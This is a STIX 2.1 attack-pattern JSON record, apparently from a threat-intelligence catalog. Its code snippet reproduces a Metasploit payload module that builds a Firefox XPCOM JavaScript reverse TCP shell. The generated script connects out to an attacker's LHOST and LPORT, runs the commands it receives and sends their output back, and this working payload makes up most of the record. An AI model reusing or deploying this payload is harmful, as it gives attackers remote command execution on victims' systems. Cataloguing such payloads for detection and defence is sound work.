{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--fcdb0bd5-1dbc-4064-9a51-2dc75f9f5519",
    "created": "2024-08-14T16:33:19.391205Z",
    "modified": "2024-08-14T16:33:19.391209Z",
    "name": "Command Shell, Reverse TCP (via Firefox XPCOM script)",
    "description": "Creates an interactive shell via Javascript with access to Firefoxs XPCOM API",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/payloads/singles/firefox/shell_reverse_tcp.rb",
            "external_id": "shell_reverse_tcp.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\n\nmodule MetasploitModule\n\n  CachedSize = :dynamic\n\n  include Msf::Payload::Single\n  include Msf::Payload::Firefox\n  include Msf::Sessions::CommandShellOptions\n\n  def initialize(info={})\n    super(merge_info(info,\n      'Name'          => 'Command Shell, Reverse TCP (via Firefox XPCOM script)',\n      'Description'   => %q{Creates an interactive shell via Javascript with access to Firefox's XPCOM API},\n      'Author'        => ['joev'],\n      'License'       => BSD_LICENSE,\n      'Platform'      => 'firefox',\n      'Arch'          => ARCH_FIREFOX,\n      'Handler'       => Msf::Handler::ReverseTcp,\n      'Session'       => Msf::Sessions::CommandShell,\n      'PayloadType'   => 'firefox'\n    ))\n  end\n\n  def generate(_opts = {})\n    <<-EOS\n\n      (function(){\n        window = this;\n\n        Components.utils.import(\"resource://gre/modules/NetUtil.jsm\");\n        var host = '#{datastore[\"LHOST\"]}';\n        var port = #{datastore[\"LPORT\"]};\n\n        var socketTransport = Components.classes[\"@mozilla.org/network/socket-transport-service;1\"]\n                                .getService(Components.interfaces.nsISocketTransportService);\n        var socket = socketTransport.createTransport(null, 0, host, port, null);\n        var outStream = socket.openOutputStream(0, 0, 0);\n        var inStream = socket.openInputStream(0, 0, 0);\n\n        var pump = Components.classes[\"@mozilla.org/network/input-stream-pump;1\"]\n                       .createInstance(Components.interfaces.nsIInputStreamPump);\n        pump.init(inStream, -1, -1, 0, 0, true);\n\n        #{read_until_token_source}\n\n        var listener = {\n          onStartRequest: function(request, context) {},\n          onStopRequest: function(request, context) {},\n          onDataAvailable: readUntilToken(function(data) {\n            runCmd(data, function(err, output) {\n              if (!err) outStream.write(output, output.length);\n            });\n          })\n        };\n\n        #{run_cmd_source}\n\n        pump.asyncRead(listener, null);\n      })();\n\n    EOS\n  end\nend\n",
    "x_mitre_platforms": [
        "firefox'"
    ]
}